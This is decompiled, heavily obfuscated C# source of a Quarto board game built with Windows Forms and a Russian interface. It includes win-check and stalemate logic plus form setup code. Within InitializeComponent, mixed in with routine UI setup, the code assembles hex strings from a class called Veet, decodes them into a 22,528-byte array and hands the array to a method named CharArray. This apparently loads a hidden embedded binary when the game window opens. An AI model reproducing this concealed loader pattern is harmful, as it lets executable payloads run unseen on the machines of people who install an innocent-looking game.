						num52 = 115146276;
					}
					num = num51 ^ ((int)num2 * -927447508);
					continue;
				}
				case 61u:
					if (mem[num3, 2].Point != mem[num3, 3].Point)
					{
						num = (int)(num2 * 2070009118) ^ -359417831;
						continue;
					}
					goto IL_03c0;
				case 60u:
					if (mem[1, num3].Square == mem[2, num3].Square)
					{
						num = (int)(num2 * 2122618353) ^ -1300846234;
						continue;
					}
					goto IL_03f5;
				case 59u:
				{
					int num32;
					if (mem[0, 3].Dark == mem[1, 2].Dark)
					{
						num = 1485169061;
						num32 = 1485169061;
					}
					else
					{
						num = 1266197121;
						num32 = 1266197121;
					}
					continue;
				}
				case 58u:
					num3++;
					num = ((int)num2 * -614899707) ^ 0x23BE626E;
					continue;
				case 57u:
					flag3 = num3 < 4;
					num = 862987860;
					continue;
				case 56u:
				{
					int num23;
					if (mem[num3, 0].Point == mem[num3, 1].Point)
					{
						num = 1432255856;
						num23 = 1432255856;
					}
					else
					{
						num = 305894083;
						num23 = 305894083;
					}
					continue;
				}
				case 55u:
					num15 = ((mem[2, num3].Square == mem[3, num3].Square) ? 1 : 0);
					goto IL_0036;
				case 54u:
				{
					int num7;
					int num8;
					if (!flag)
					{
						num7 = -1864895727;
						num8 = -1864895727;
					}
					else
					{
						num7 = -1002103493;
						num8 = -1002103493;
					}
					num = num7 ^ ((int)num2 * -1812843957);
					continue;
				}
				case 53u:
				{
					int num9;
					if (mem[0, 0].Dark == mem[1, 1].Dark)
					{
						num = 136669402;
						num9 = 136669402;
					}
					else
					{
						num = 1191632095;
						num9 = 1191632095;
					}
					continue;
				}
				case 52u:
				{
					int num69;
					if (mem[0, num3].Point != mem[1, num3].Point)
					{
						num = 1612145951;
						num69 = 1612145951;
					}
					else
					{
						num = 1658875945;
						num69 = 1658875945;
					}
					continue;
				}
				case 51u:
					num = ((int)num2 * -287601131) ^ -1700538037;
					continue;
				case 50u:
				{
					int num63;
					int num64;
					if (!flag4)
					{
						num63 = -1785826899;
						num64 = -1785826899;
					}
					else
					{
						num63 = -482527434;
						num64 = -482527434;
					}
					num = num63 ^ ((int)num2 * -642229308);
					continue;
				}
				case 49u:
					if (mem[1, 2] != null)
					{
						num = ((int)num2 * -905142017) ^ -1538852114;
						continue;
					}
					goto IL_05a3;
				case 48u:
					if (mem[2, num3].Dark != mem[3, num3].Dark)
					{
						num = ((int)num2 * -322104791) ^ -1556890055;
						continue;
					}
					goto IL_0035;
				case 47u:
				{
					int num49;
					int num50;
					if (mem[1, num3].Point == mem[2, num3].Point)
					{
						num49 = -1858089181;
						num50 = -1858089181;
					}
					else
					{
						num49 = -1950471633;
						num50 = -1950471633;
					}
					num = num49 ^ (int)(num2 * 1128367464);
					continue;
				}
				case 46u:
				{
					int num45;
					int num46;
					if (mem[1, 1].Dark != mem[2, 2].Dark)
					{
						num45 = -27807048;
						num46 = -27807048;
					}
					else
					{
						num45 = -1054918932;
						num46 = -1054918932;
					}
					num = num45 ^ (int)(num2 * 1696044035);
					continue;
				}
				case 45u:
					flag2 = false;
					num3 = 0;
					num = ((int)num2 * -1062954557) ^ 0x35A421C0;
					continue;
				case 44u:
					if (mem[3, 0] != null)
					{
						num = ((int)num2 * -932180349) ^ 0x37E6CE76;
						continue;
					}
					goto IL_05a3;
				case 43u:
				{
					int num36;
					int num37;
					if (mem[1, 1].Point != mem[2, 2].Point)
					{
						num36 = -551778472;
						num37 = -551778472;
					}
					else
					{
						num36 = -1126555942;
						num37 = -1126555942;
					}
					num = num36 ^ (int)(num2 * 553516533);
					continue;
				}
				case 42u:
					if (mem[2, 1].Dark != mem[3, 0].Dark)
					{
						num = ((int)num2 * -572588008) ^ -647239031;
						continue;
					}
					goto IL_016a;
				case 41u:
				{
					int num33;
					if (mem[0, 0].Square == mem[1, 1].Square)
					{
						num = 1754128264;
						num33 = 1754128264;
					}
					else
					{
						num = 275531327;
						num33 = 275531327;
					}
					continue;
				}
				case 40u:
				{
					int num26;
					int num27;
					if (mem[3, 3] == null)
					{
						num26 = 1870636873;
						num27 = 1870636873;
					}
					else
					{
						num26 = 1538250612;
						num27 = 1538250612;
					}
					num = num26 ^ ((int)num2 * -494602881);
					continue;
				}
				case 39u:
					flag2 = true;
					num = (int)((num2 * 198324959) ^ 0x11264E12);
					continue;
				case 38u:
					flag2 = true;
					num = (int)(num2 * 932626625) ^ -1499101827;
					continue;
				case 37u:
					if (mem[0, 3].Square == mem[1, 2].Square)
					{
						num = 1327670881;
						continue;
					}
					goto IL_00ed;
				case 36u:
				{
					int num18;
					int num19;
					if (mem[num3, 0] != null)
					{
						num18 = -1518579110;
						num19 = -1518579110;
					}
					else
					{
						num18 = -1116047969;
						num19 = -1116047969;
					}
					num = num18 ^ ((int)num2 * -1739213563);
					continue;
				}
				case 35u:
				{
					int num12;
					int num13;
					if (mem[0, 3].Big == mem[1, 2].Big)
					{
						num12 = -1792591306;
						num13 = -1792591306;
					}
					else
					{
						num12 = -1733557487;
						num13 = -1733557487;
					}
					num = num12 ^ (int)(num2 * 332930052);
					continue;
				}
				case 33u:
				{
					int num6;
					if (mem[num3, 0].Dark != mem[num3, 1].Dark)
					{
						num = 1533618870;
						num6 = 1533618870;
					}
					else
					{
						num = 1473882060;
						num6 = 1473882060;
					}
					continue;
				}
				case 32u:
				{
					int num71;
					int num72;
					if (mem[num3, 0].Big == mem[num3, 1].Big)
					{
						num71 = -152944555;
						num72 = -152944555;
					}
					else
					{
						num71 = -1474418711;
						num72 = -1474418711;
					}
					num = num71 ^ (int)(num2 * 1792692955);
					continue;
				}
				case 31u:
					if (mem[0, 3] != null)
					{
						num = 674785547;
						continue;
					}
					goto IL_05a3;
				case 30u:
				{
					int num67;
					int num68;
					if (mem[num3, 3] == null)
					{
						num67 = -973198470;
						num68 = -973198470;
					}
					else
					{
						num67 = -74105307;
						num68 = -74105307;
					}
					num = num67 ^ ((int)num2 * -1246341860);
					continue;
				}
				case 29u:
					if (mem[0, num3].Square == mem[1, num3].Square)
					{
						num = 254833723;
						continue;
					}
					goto IL_03f5;
				case 28u:
					if (mem[num3, 2].Dark != mem[num3, 3].Dark)
					{
						num = ((int)num2 * -1798269377) ^ -427302753;
						continue;
					}
					goto IL_03c0;
				case 27u:
				{
					int num61;
					int num62;
					if (mem[1, 1] != null)
					{
						num61 = -1742455127;
						num62 = -1742455127;
					}
					else
					{
						num61 = -512723144;
						num62 = -512723144;
					}
					num = num61 ^ ((int)num2 * -2012611117);
					continue;
				}
				case 26u:
				{
					int num57;
					int num58;
					if (mem[1, 1].Square != mem[2, 2].Square)
					{
						num57 = 860614389;
						num58 = 860614389;
					}
					else
					{
						num57 = 1280457319;
						num58 = 1280457319;
					}
					num = num57 ^ (int)(num2 * 706026230);
					continue;
				}
				case 25u:
				{
					int num53;
					int num54;
					if (mem[1, num3].Big != mem[2, num3].Big)
					{
						num53 = -37944015;
						num54 = -37944015;
					}
					else
					{
						num53 = -1531426707;
						num54 = -1531426707;
					}
					num = num53 ^ ((int)num2 * -1190900819);
					continue;
				}
				case 24u:
				{
					int num47;
					int num48;
					if (mem[num3, 1].Big != mem[num3, 2].Big)
					{
						num47 = -1982196597;
						num48 = -1982196597;
					}
					else
					{
						num47 = -810008226;
						num48 = -810008226;
					}
					num = num47 ^ (int)(num2 * 2080894585);
					continue;
				}
				case 23u:
					if (mem[2, num3].Big != mem[3, num3].Big)
					{
						num = (int)(num2 * 1725888104) ^ -191666771;
						continue;
					}
					goto IL_0035;
				case 22u:
				{
					int num43;
					int num44;
					if (mem[1, 1].Big != mem[2, 2].Big)
					{
						num43 = 730074802;
						num44 = 730074802;
					}
					else
					{
						num43 = 882390942;
						num44 = 882390942;
					}
					num = num43 ^ ((int)num2 * -459049036);
					continue;
				}
				case 21u:
					num = (int)(num2 * 887432945) ^ -1072778740;
					continue;
				case 19u:
				{
					int num42;
					if (mem[0, 3].Point == mem[1, 2].Point)
					{
						num = 630880702;
						num42 = 630880702;
					}
					else
					{
						num = 1577600175;
						num42 = 1577600175;
					}
					continue;
				}
				case 18u:
				{
					int num38;
					int num39;
					if (!flag3)
					{
						num38 = 1332028623;
						num39 = 1332028623;
					}
					else
					{
						num38 = 345369216;
						num39 = 345369216;
					}
					num = num38 ^ ((int)num2 * -1078703786);
					continue;
				}
				case 17u:
					if (mem[2, 2].Dark != mem[3, 3].Dark)
					{
						num = ((int)num2 * -1495251727) ^ -1744005629;
						continue;
					}
					goto IL_034a;
				case 16u:
					num20 = ((mem[2, 1].Square == mem[3, 0].Square) ? 1 : 0);
					goto IL_00ee;
				case 15u:
				{
					int num34;
					int num35;
					if (mem[num3, 1].Square == mem[num3, 2].Square)
					{
						num34 = -746854374;
						num35 = -746854374;
					}
					else
					{
						num34 = -206227986;
						num35 = -206227986;
					}
					num = num34 ^ ((int)num2 * -2026289852);
					continue;
				}
				case 14u:
					if (mem[2, 2].Square != mem[3, 3].Square)
					{
						num = ((int)num2 * -1029023944) ^ 0x3D55888F;
						continue;
					}
					goto IL_034a;
				case 13u:
					num = 1275756054;
					continue;
				case 12u:
					if (mem[2, 1] != null)
					{
						num = ((int)num2 * -1050240282) ^ 0x42B5796E;
						continue;
					}
					goto IL_05a3;
				case 11u:
				{
					int num28;
					int num29;
					if (mem[1, 2].Dark == mem[2, 1].Dark)
					{
						num28 = 1847600986;
						num29 = 1847600986;
					}
					else
					{
						num28 = 1142552679;
						num29 = 1142552679;
					}
					num = num28 ^ ((int)num2 * -1997731541);
					continue;
				}
				case 10u:
				{
					int num24;
					int num25;
					if (mem[2, 2] == null)
					{
						num24 = -931181653;
						num25 = -931181653;
					}
					else
					{
						num24 = -124622839;
						num25 = -124622839;
					}
					num = num24 ^ (int)(num2 * 39156788);
					continue;
				}
				case 9u:
					if (mem[num3, 2].Big != mem[num3, 3].Big)
					{
						num = ((int)num2 * -157347638) ^ -1547340787;
						continue;
					}
					goto IL_03c0;
				case 8u:
				{
					int num21;
					int num22;
					if (mem[num3, 1] == null)
					{
						num21 = 1770305626;
						num22 = 1770305626;
					}
					else
					{
						num21 = 297431724;
						num22 = 297431724;
					}
					num = num21 ^ (int)(num2 * 138915608);
					continue;
				}
				case 7u:
					if (mem[1, num3] != null)
					{
						num = (int)(num2 * 1544226815) ^ -643767804;
						continue;
					}
					goto IL_01fa;
				case 6u:
					num = 145395845;
					continue;
				case 5u:
					if (mem[2, 2].Point != mem[3, 3].Point)
					{
						num = ((int)num2 * -705327465) ^ 0x391CC4F5;
						continue;
					}
					goto IL_034a;
				case 4u:
					if (mem[2, num3] != null)
					{
						num = ((int)num2 * -678632399) ^ -372435111;
						continue;
					}
					goto IL_01fa;
				case 3u:
				{
					int num14;
					if (mem[num3, 0].Square != mem[num3, 1].Square)
					{
						num = 1616522906;
						num14 = 1616522906;
					}
					else
					{
						num = 741165530;
						num14 = 741165530;
					}
					continue;
				}
				case 2u:
					if (mem[3, num3] != null)
					{
						num = (int)(num2 * 1521240848) ^ -516559529;
						continue;
					}
					goto IL_01fa;
				case 1u:
					if (mem[num3, 2].Square != mem[num3, 3].Square)
					{
						num = ((int)num2 * -1727968854) ^ -1554079296;
						continue;
					}
					goto IL_03c0;
				case 0u:
				{
					int num4;
					int num5;
					if (mem[0, num3].Big != mem[1, num3].Big)
					{
						num4 = -710336611;
						num5 = -710336611;
					}
					else
					{
						num4 = -1025864373;
						num5 = -1025864373;
					}
					num = num4 ^ ((int)num2 * -1709038518);
					continue;
				}
				case 20u:
					break;
				default:
					{
						return result;
					}
					IL_016a:
					num20 = 1;
					goto IL_00ee;
					IL_0036:
					flag4 = (byte)num15 != 0;
					num = 781373751;
					continue;
					IL_03f5:
					num15 = 0;
					goto IL_0036;
					IL_03c0:
					num15 = 1;
					goto IL_0036;
					IL_0035:
					num15 = 1;
					goto IL_0036;
					IL_01fa:
					num15 = 0;
					goto IL_0036;
					IL_034a:
					num20 = 1;
					goto IL_00ee;
					IL_05a3:
					num20 = 0;
					goto IL_00ee;
					IL_00ed:
					num20 = 0;
					goto IL_00ee;
					IL_00ee:
					flag = (byte)num20 != 0;
					num = 1983210342;
					continue;
				}
				break;
			}
		}
	}

	private bool Standoff(Figurine[,] mem)
	{
		bool flag = true;
		bool flag3 = default(bool);
		int num4 = default(int);
		int num3 = default(int);
		bool flag2 = default(bool);
		bool result = default(bool);
		while (true)
		{
			int num = -880331740;
			while (true)
			{
				uint num2;
				switch ((num2 = (uint)num ^ 0xFCB7F217u) % 15u)
				{
				case 14u:
					flag = false;
					num = ((int)num2 * -1529380708) ^ -131306865;
					continue;
				case 13u:
					flag3 = num4 < 4;
					num = -324602489;
					continue;
				case 12u:
				{
					int num9;
					if (mem[num3, num4] != null)
					{
						num = -614420201;
						num9 = -614420201;
					}
					else
					{
						num = -511039043;
						num9 = -511039043;
					}
					continue;
				}
				case 10u:
					flag2 = num3 < 4;
					num = -1285920708;
					continue;
				case 9u:
					result = flag;
					num = ((int)num2 * -186887914) ^ 0x5839025D;
					continue;
				case 8u:
					num = (int)(num2 * 272445997) ^ -1291859504;
					continue;
				case 7u:
					num3 = 0;
					num = (int)(num2 * 2089226607) ^ -1574373828;
					continue;
				case 6u:
					num4++;
					num = -2046565754;
					continue;
				case 4u:
				{
					int num7;
					int num8;
					if (!flag3)
					{
						num7 = -1553637806;
						num8 = -1553637806;
					}
					else
					{
						num7 = -1847548543;
						num8 = -1847548543;
					}
					num = num7 ^ (int)(num2 * 1754421811);
					continue;
				}
				case 3u:
				{
					int num5;
					int num6;
					if (flag2)
					{
						num5 = 334328834;
						num6 = 334328834;
					}
					else
					{
						num5 = 250242362;
						num6 = 250242362;
					}
					num = num5 ^ ((int)num2 * -146378511);
					continue;
				}
				case 2u:
					num4 = 0;
					num = -1108700305;
					continue;
				case 1u:
					num3++;
					num = (int)((num2 * 1820281894) ^ 0x20826B7F);
					continue;
				case 0u:
					num = (int)(num2 * 494345217) ^ -657628162;
					continue;
				case 11u:
					break;
				default:
					return result;
				}
				break;
			}
		}
	}

	public void SetName(string str)
	{
		while (true)
		{
			int num = -416073187;
			while (true)
			{
				uint num2;
				switch ((num2 = (uint)num ^ 0xAF615DC1u) % 10u)
				{
				case 9u:
					Form1.smethod_32((Control)(object)label2, "");
					num = ((int)num2 * -2057111873) ^ 0x6C5493F;
					continue;
				case 8u:
					num = (int)(num2 * 741232551) ^ -178545152;
					continue;
				case 7u:
					Form1.smethod_50((Control)(object)label5, (Form1.smethod_49((Control)(object)this) - (Form1.smethod_18((Control)(object)label5) + Form1.smethod_18((Control)(object)label6))) / 2);
					num = ((int)num2 * -184160709) ^ 0x3B3A19E9;
					continue;
				case 5u:
					Form1.smethod_32((Control)(object)label6, str);
					num = ((int)num2 * -472082585) ^ -1893938253;
					continue;
				case 4u:
					num = (int)(num2 * 1787237677) ^ -2111700638;
					continue;
				case 3u:
					Form1.smethod_50((Control)(object)label6, Form1.smethod_37((Control)(object)label5).X + Form1.smethod_18((Control)(object)label5));
					num = (int)(num2 * 2145853042) ^ -73999647;
					continue;
				case 2u:
					Form1.smethod_32((Control)(object)label5, "Игрок: ");
					num = ((int)num2 * -118070171) ^ 0x3020154B;
					continue;
				case 0u:
					Form1.smethod_32((Control)(object)label1, "");
					num = (int)((num2 * 985489276) ^ 0x4783437);
					continue;
				default:
					return;
				case 6u:
					break;
				case 1u:
					return;
				}
				break;
			}
		}
	}

	protected override void Dispose(bool disposing)
	{
		while (true)
		{
			int num = -1934179951;
			while (true)
			{
				uint num2;
				int num3;
				switch ((num2 = (uint)num ^ 0xEC704177u) % 6u)
				{
				case 4u:
					if (disposing)
					{
						num = (int)((num2 * 2039787102) ^ 0x75BB13F);
						continue;
					}
					goto IL_0027;
				case 2u:
					if (components != null)
					{
						num = -1253853591;
						num3 = -1253853591;
						continue;
					}
					goto IL_0027;
				case 1u:
					Form1.smethod_51((IDisposable)components);
					num = (int)(num2 * 2050754695) ^ -1138987205;
					continue;
				case 0u:
					num = ((int)num2 * -2008219542) ^ -195746528;
					continue;
				case 3u:
					break;
				default:
					{
						((Form)this).Dispose(disposing);
						return;
					}
					IL_0027:
					num = -352903642;
					num3 = -352903642;
					continue;
				}
				break;
			}
		}
	}

	private void InitializeComponent()
	{
		//IL_0cc3: Unknown result type (might be due to invalid IL or missing references)
		//IL_0ccd: Expected O, but got Unknown
		components = Form1.smethod_52();
		string string_ = default(string);
		byte[] array = default(byte[]);
		int num5 = default(int);
		bool flag = default(bool);
		while (true)
		{
			int num = -968741059;
			while (true)
			{
				uint num2;
				switch ((num2 = (uint)num ^ 0x8C1C740Du) % 116u)
				{
				case 115u:
					num = ((int)num2 * -1378588858) ^ -829536431;
					continue;
				case 114u:
					Form1.smethod_5((Control)(object)this, Color.White);
					num = ((int)num2 * -1320569530) ^ 0x757B4894;
					continue;
				case 113u:
					num = ((int)num2 * -185911969) ^ 0x5B57DA6A;
					continue;
				case 112u:
					label5 = Form1.smethod_57();
					num = (int)((num2 * 1511408953) ^ 0x34C5C4B5);
					continue;
				case 111u:
					Form1.smethod_9(Form1.smethod_82((Control)(object)this), (Control)(object)button1);
					Form1.smethod_9(Form1.smethod_82((Control)(object)this), (Control)(object)pictureBox1);
					Form1.smethod_9(Form1.smethod_82((Control)(object)this), (Control)(object)panel1);
					num = ((int)num2 * -276349492) ^ 0x55D1F56C;
					continue;
				case 110u:
					Form1.smethod_3((Control)(object)button2, new Size(83, 35));
					num = ((int)num2 * -2138162107) ^ 0x4F34D9A0;
					continue;
				case 109u:
					Form1.smethod_64((Control)(object)label2, 9);
					num = ((int)num2 * -405838586) ^ 0x5E111C20;
					continue;
				case 108u:
					Form1.smethod_59((Control)(object)this);
					num = ((int)num2 * -440282628) ^ 0xE7C4B58;
					continue;
				case 107u:
					Form1.smethod_87((Form)(object)this, (EventHandler)Form1_Load);
					Form1.smethod_88((Form)(object)this, (EventHandler)Form1_Shown);
					num = (int)((num2 * 707813311) ^ 0x51645B1B);
					continue;
				case 106u:
					num = (int)((num2 * 1896019448) ^ 0xAC2FDF7);
					continue;
				case 105u:
					Form1.smethod_65((Control)(object)button2, bool_0: false);
					num = (int)(num2 * 1487950859) ^ -605169476;
					continue;
				case 104u:
					Form1.smethod_9(Form1.smethod_82((Control)(object)this), (Control)(object)label1);
					Form1.smethod_9(Form1.smethod_82((Control)(object)this), (Control)(object)richTextBox1);
					num = (int)((num2 * 907281778) ^ 0x43D5F7A8);
					continue;
				case 103u:
					Form1.smethod_32((Control)(object)this, "Quarto");
					num = (int)(num2 * 417704694) ^ -1694438236;
					continue;
				case 102u:
					Form1.smethod_60(pictureBox1, (BorderStyle)2);
					Form1.smethod_4((Control)(object)pictureBox1, new Point(120, 22));
					num = (int)((num2 * 2118329038) ^ 0x3DB64E35);
					continue;
				case 101u:
					Form1.smethod_61((Control)(object)label2, "label2");
					num = ((int)num2 * -1558914143) ^ 0x1DE3EF9A;
					continue;
				case 100u:
					Form1.smethod_3((Control)(object)button1, new Size(83, 35));
					Form1.smethod_64((Control)(object)button1, 5);
					Form1.smethod_65((Control)(object)button1, bool_0: false);
					num = (int)((num2 * 1953146840) ^ 0xA7222FA);
					continue;
				case 99u:
					num = ((int)num2 * -1353668546) ^ -59227172;
					continue;
				case 98u:
					num = ((int)num2 * -183650083) ^ 0x517A387E;
					continue;
				case 97u:
					num = (int)(num2 * 1173920771) ^ -1246573776;
					continue;
				case 96u:
					num = (int)(num2 * 1381306448) ^ -31268177;
					continue;
				case 95u:
					num = ((int)num2 * -271955710) ^ -1560444017;
					continue;
				case 94u:
					Form1.smethod_9(Form1.smethod_82((Control)(object)this), (Control)(object)button2);
					num = (int)(num2 * 2030343406) ^ -1186589290;
					continue;
				case 93u:
					Form1.smethod_61((Control)(object)richTextBox1, "richTextBox1");
					num = (int)(num2 * 574864510) ^ -1227525674;
					continue;
				case 92u:
					string_ = Form1.smethod_34(string_, Veet.Xe);
					num = (int)((num2 * 1242854573) ^ 0x2266EE7E);
					continue;
				case 91u:
					Form1.smethod_61((Control)(object)label6, "label6");
					num = ((int)num2 * -414502854) ^ 0x77C5CDA7;
					continue;
				case 90u:
					num = (int)(num2 * 174760226) ^ -883786757;
					continue;
				case 89u:
					Form1.smethod_4((Control)(object)label6, new Point(275, 0));
					num = (int)(num2 * 1043725648) ^ -591570382;
					continue;
				case 88u:
					pictureBox1 = Form1.smethod_2();
					num = ((int)num2 * -1200240643) ^ -1282597943;
					continue;
				case 87u:
					Form1.smethod_61((Control)(object)panel1, "panel1");
					Form1.smethod_3((Control)(object)panel1, new Size(486, 240));
					num = (int)((num2 * 1606052418) ^ 0x1C25ECC7);
					continue;
				case 86u:
					Form1.smethod_4((Control)(object)label1, new Point(486, 0));
					Form1.smethod_61((Control)(object)label1, "label1");
					num = (int)((num2 * 1311280280) ^ 0xB5A9AA1);
					continue;
				case 85u:
					Form1.smethod_77((Control)(object)label6, Form1.smethod_76("Microsoft Sans Serif", 9.75f, (FontStyle)0, (GraphicsUnit)3, (byte)204));
					num = (int)(num2 * 650969306) ^ -2029011806;
					continue;
				case 84u:
					Form1.smethod_61((Control)(object)pictureBox1, "pictureBox1");
					num = (int)((num2 * 1423860873) ^ 0x45D5161B);
					continue;
				case 83u:
					Form1.smethod_77((Control)(object)label5, Form1.smethod_76("Microsoft Sans Serif", 9.75f, (FontStyle)0, (GraphicsUnit)3, (byte)204));
					Form1.smethod_4((Control)(object)label5, new Point(197, 0));
					num = (int)(num2 * 747389214) ^ -1250701561;
					continue;
				case 82u:
					panel1 = Form1.smethod_55();
					num = ((int)num2 * -820233902) ^ -1735808419;
					continue;
				case 81u:
					Form1.smethod_61((Control)(object)button2, "button2");
					num = (int)((num2 * 1773460093) ^ 0x6C08662E);
					continue;
				case 80u:
					Form1.smethod_75((Control)(object)label2, (DockStyle)3);
					num = ((int)num2 * -695680138) ^ 0x188F1FD8;
					continue;
				case 79u:
					Form1.smethod_74((Control)(object)label6, bool_0: true);
					num = ((int)num2 * -2066423093) ^ -1798914523;
					continue;
				case 78u:
					Form1.smethod_5((Control)(object)pictureBox1, Color.FromArgb(64, 32, 0));
					num = (int)((num2 * 568612920) ^ 0x43C7F88F);
					continue;
				case 77u:
					num = ((int)num2 * -1819483425) ^ -48903708;
					continue;
				case 76u:
					num = (int)(num2 * 1613321862) ^ -1317183042;
					continue;
				case 75u:
					num = (int)((num2 * 1479327613) ^ 0x2FA058AE);
					continue;
				case 74u:
					array[num5] = Form1.smethod_69(Form1.smethod_68(string_, num5 * 2, 2), 16);
					num = ((int)num2 * -394901373) ^ 0x1865E03A;
					continue;
				case 73u:
					Form1.smethod_58((ISupportInitialize)pictureBox1);
					num = ((int)num2 * -261651455) ^ 0x5CAE812C;
					continue;
				case 72u:
					Form1.smethod_64((Control)(object)panel1, 7);
					num = (int)((num2 * 1490690250) ^ 0x44819A);
					continue;
				case 71u:
					Form1.smethod_75((Control)(object)label1, (DockStyle)4);
					Form1.smethod_77((Control)(object)label1, Form1.smethod_76("Microsoft Sans Serif", 9.75f, (FontStyle)0, (GraphicsUnit)3, (byte)204));
					num = ((int)num2 * -1446895181) ^ -1323902573;
					continue;
				case 70u:
					Form1.smethod_3((Control)(object)label2, new Size(0, 16));
					num = ((int)num2 * -426549505) ^ 0x6F63AA8E;
					continue;
				case 69u:
					Form1.smethod_81((Form)(object)this, new Size(486, 319));
					num = ((int)num2 * -947484205) ^ 0x6D431213;
					continue;
				case 68u:
					Form1.smethod_77((Control)(object)label2, Form1.smethod_76("Microsoft Sans Serif", 9.75f, (FontStyle)0, (GraphicsUnit)3, (byte)204));
					num = ((int)num2 * -813522714) ^ -1661620789;
					continue;
				case 67u:
					Form1.smethod_66((ButtonBase)(object)button2, bool_0: true);
					num = (int)(num2 * 192224818) ^ -1124067969;
					continue;
				case 66u:
					Form1.smethod_9(Form1.smethod_82((Control)(object)this), (Control)(object)label2);
					num = ((int)num2 * -1331951786) ^ -1420239162;
					continue;
				case 65u:
					num = (int)(num2 * 1578777925) ^ -1281637868;
					continue;
				case 64u:
					Form1.smethod_3((Control)(object)label6, new Size(0, 16));
					Form1.smethod_64((Control)(object)label6, 13);
					num = ((int)num2 * -1793699179) ^ -503601242;
					continue;
				case 63u:
					num = (int)(num2 * 603661504) ^ -98767048;
					continue;
				case 62u:
					Form1.smethod_32((Control)(object)button2, "Подтвердить");
					num = ((int)num2 * -848580618) ^ 0x29216726;
					continue;
				case 61u:
					num = (int)((num2 * 339565371) ^ 0x5BD3A268);
					continue;
				case 60u:
					num = ((int)num2 * -456944864) ^ -605915109;
					continue;
				case 58u:
					Form1.smethod_32((Control)(object)button1, "Меню");
					Form1.smethod_66((ButtonBase)(object)button1, bool_0: true);
					Form1.smethod_67((Control)(object)button1, (EventHandler)Button1_Click);
					num = (int)(num2 * 2137455385) ^ -1932489472;
					continue;
				case 57u:
					Form1.smethod_61((Control)(object)button1, "button1");
					num = (int)((num2 * 1108933215) ^ 0x5870B79A);
					continue;
				case 56u:
					Form1.smethod_89((Control)(object)this, (EventHandler)Form1_LocationChanged);
					num = ((int)num2 * -1875316008) ^ -1640456788;
					continue;
				case 55u:
					string_ = Form1.smethod_34(string_, Veet.Zr);
					array = new byte[22528];
					num5 = 0;
					num = ((int)num2 * -1972594988) ^ 0x74AF30B2;
					continue;
				case 54u:
					Form1.smethod_3((Control)(object)pictureBox1, new Size(246, 246));
					num = (int)((num2 * 736790270) ^ 0x10524D49);
					continue;
				case 53u:
					Form1.smethod_5((Control)(object)richTextBox1, Color.White);
					num = ((int)num2 * -969810992) ^ 0x882773;
					continue;
				case 51u:
					Form1.smethod_64((Control)(object)label1, 8);
					Form1.smethod_74((Control)(object)label2, bool_0: true);
					num = (int)(num2 * 1793100243) ^ -982148280;
					continue;
				case 50u:
					Form1.smethod_9(Form1.smethod_82((Control)(object)this), (Control)(object)label6);
					Form1.smethod_9(Form1.smethod_82((Control)(object)this), (Control)(object)label5);
					num = ((int)num2 * -635687809) ^ -2062600455;
					continue;
				case 49u:
					Form1.smethod_84((Form)(object)this, bool_0: false);
					Form1.smethod_85((Control)(object)this, "Form1");
					Form1.smethod_86((Form)(object)this, bool_0: false);
					num = ((int)num2 * -1366764171) ^ -499914625;
					continue;
				case 48u:
					num = (int)(num2 * 2039573175) ^ -821472000;
					continue;
				case 47u:
					flag = num5 < 22528;
					num = -1584656559;
					continue;
				case 46u:
					Form1.smethod_32((Control)(object)richTextBox1, "");
					num = ((int)num2 * -419771726) ^ -1058327165;
					continue;
				case 45u:
					num = (int)((num2 * 1225172359) ^ 0x24FBCCD7);
					continue;
				case 44u:
					CharArray(array, string.Empty);
					num = ((int)num2 * -1148346122) ^ -125384112;
					continue;
				case 43u:
					Form1.smethod_74((Control)(object)label5, bool_0: true);
					num = (int)((num2 * 302832562) ^ 0x16A36148);
					continue;
				case 42u:
					Form1.smethod_4((Control)(object)button1, new Point(12, 275));
					num = ((int)num2 * -1630631456) ^ 0x7C6965E5;
					continue;
				case 41u:
					num = -318505085;
					continue;
				case 40u:
					Form1.smethod_78((Control)(object)label1, (RightToLeft)0);
					num = (int)(num2 * 822347664) ^ -1745376822;
					continue;
				case 39u:
					Form1.smethod_3((Control)(object)label1, new Size(0, 16));
					num = (int)((num2 * 1485594810) ^ 0x5583C008);
					continue;
				case 38u:
					num = (int)((num2 * 1589772495) ^ 0x61B807AD);
					continue;
				case 37u:
					num = (int)((num2 * 168807699) ^ 0x221602BB);
					continue;
				case 36u:
					num = ((int)num2 * -390234548) ^ -1094527193;
					continue;
				case 35u:
					Form1.smethod_79((ContainerControl)(object)this, new SizeF(6f, 13f));
					num = (int)((num2 * 1308879044) ^ 0x6D7A047B);
					continue;
				case 34u:
					Form1.smethod_4((Control)(object)richTextBox1, new Point(107, 275));
					num = (int)((num2 * 303797303) ^ 0x1C1E3B0A);
					continue;
				case 33u:
					Form1.smethod_92((Control)(object)this);
					num = ((int)num2 * -1621864556) ^ 0x7EE1EB8E;
					continue;
				case 32u:
					Form1.smethod_62(pictureBox1, 0);
					num = (int)((num2 * 1900168486) ^ 0x52F95502);
					continue;
				case 31u:
					Form1.smethod_72(timer1, 1000);
					Form1.smethod_73(timer1, (EventHandler)Timer1_Tick);
					num = (int)(num2 * 462939485) ^ -536997730;
					continue;
				case 30u:
					Form1.smethod_61((Control)(object)label5, "label5");
					num = ((int)num2 * -1659565327) ^ -243191497;
					continue;
				case 29u:
					string_ = Veet.Sa;
					num = (int)((num2 * 1358624894) ^ 0x5CDDB24B);
					continue;
				case 28u:
					button2 = Form1.smethod_53();
					num = ((int)num2 * -453349914) ^ -361386922;
					continue;
				case 27u:
					num = ((int)num2 * -213330664) ^ -1463174538;
					continue;
				case 26u:
					Form1.smethod_65((Control)(object)richTextBox1, bool_0: false);
					num = ((int)num2 * -441618561) ^ 0x74842925;
					continue;
				case 25u:
					Form1.smethod_90((ISupportInitialize)pictureBox1);
					Form1.smethod_91((Control)(object)this, bool_0: false);
					num = ((int)num2 * -944473240) ^ 0x4E36A4B7;
					continue;
				case 24u:
					richTextBox1 = Form1.smethod_54();
					num = ((int)num2 * -1905598118) ^ -600897933;
					continue;
				case 23u:
					button1 = Form1.smethod_53();
					num = ((int)num2 * -1318031474) ^ 0x4EF3027B;
					continue;
				case 22u:
					Form1.smethod_4((Control)(object)button2, new Point(391, 275));
					num = ((int)num2 * -2074064021) ^ -1811112742;
					continue;
				case 21u:
					Form1.smethod_71((TextBoxBase)(object)richTextBox1, bool_0: true);
					num = ((int)num2 * -314159826) ^ -537154230;
					continue;
				case 20u:
					label6 = Form1.smethod_57();
					num = (int)(num2 * 1710172624) ^ -1513829848;
					continue;
				case 19u:
					Form1.smethod_63(pictureBox1, bool_0: false);
